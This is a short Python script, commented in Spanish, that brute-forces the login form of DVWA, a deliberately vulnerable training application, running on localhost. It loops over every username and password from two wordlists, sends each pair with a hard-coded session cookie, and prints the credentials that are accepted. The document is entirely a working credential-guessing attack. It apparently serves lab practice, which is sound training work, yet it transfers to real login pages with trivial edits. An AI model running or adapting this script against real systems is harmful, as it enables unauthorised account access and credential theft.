#!/usr/bin/env python3
"""
Script simple de fuerza bruta para DVWA
"""

import requests

# Configuración
URL = "http://127.0.0.1:8080/vulnerabilities/brute/"
PHPSESSID = "9kqb4gf1p9ec8fqpegt3jdsgn4"  # ⚠️ CAMBIAR por tu session ID

# Headers
headers = {
    "Cookie": f"security=low; PHPSESSID={PHPSESSID}"
}

# Cargar archivos
with open("./users.txt") as f:
    users = [line.strip() for line in f]

with open("./passwords.txt") as f:
    passwords = [line.strip() for line in f]

print(f"Probando {len(users)} usuarios con {len(passwords)} contraseñas...\n")

# Ataque de fuerza bruta
validos = []

for user in users:
    for pwd in passwords:
        # Hacer petición
        params = {
            "username": user,
            "password": pwd,
            "Login": "Login"
        }
        
        response = requests.get(URL, params=params, headers=headers)
        
        # Verificar si es válido
        if "Username and/or password incorrect" not in response.text:
            print(f"[✓] VÁLIDO: {user}:{pwd}")
            validos.append((user, pwd))
        else:
            print(f"[✗] {user}:{pwd}")

# Resultados
print(f"\n{'='*50}")
print(f"Credenciales válidas encontradas: {len(validos)}")
for user, pwd in validos:
    print(f"  → {user}:{pwd}")